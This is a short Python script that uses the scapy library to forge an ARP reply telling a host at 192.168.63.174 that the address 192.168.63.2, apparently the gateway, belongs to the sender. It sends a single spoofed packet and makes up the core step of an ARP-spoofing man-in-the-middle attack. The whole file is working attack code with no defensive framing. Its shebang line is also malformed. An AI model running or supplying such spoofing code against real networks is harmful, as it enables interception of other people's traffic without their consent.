#/usr/bin/env python
from scapy.layers.l2 import ARP
import scapy.all as scapy

packet = ARP(op=2, pdst="192.168.63.174", hwdst="00:0c:29:fe:37:29", psrc="192.168.63.2" )
scapy.send(packet)